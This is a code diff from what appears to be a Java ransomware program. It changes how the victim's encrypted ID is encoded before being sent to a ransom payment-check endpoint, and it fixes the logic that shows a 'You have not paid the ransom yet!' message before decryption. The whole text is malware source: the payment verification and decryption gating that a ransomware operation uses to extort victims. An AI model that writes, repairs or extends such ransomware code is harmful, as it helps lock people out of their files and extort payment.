@@ -78,7 +78,8 @@ class checkPayment implements ActionListener{
             File f = new File("/tmp/tmp/id.enc");
             byte[] encid = Files.readAllBytes(f.toPath());
             String encoded_id = Base64.getEncoder().encodeToString(encid);
-            URL obj = new URL("http://127.0.0.1/check_payment.php?id="+encoded_id);
+            String modifiedid = encoded_id.replace('+','-');
+            URL obj = new URL("http://127.0.0.1/check_payment.php?id="+modifiedid);
             HttpURLConnection con = (HttpURLConnection) obj.openConnection();
             con.setRequestMethod("GET");
             con.addRequestProperty("Victim", "Yes");
@@ -138,7 +139,7 @@ class DecryptListener implements ActionListener{
     @Override
     public void actionPerformed(ActionEvent e) {
         try{
-            if(decrypt.validatePayment()){
+            if(!decrypt.validatePayment()){
                 JFrame frame = new JFrame("Decryption Error!");
                 frame.setDefaultCloseOperation(frame.DISPOSE_ON_CLOSE);
                 JLabel label = new JLabel("<html><h3>You have not paid the ransom yet!</h3></html>",SwingConstants.CENTER);
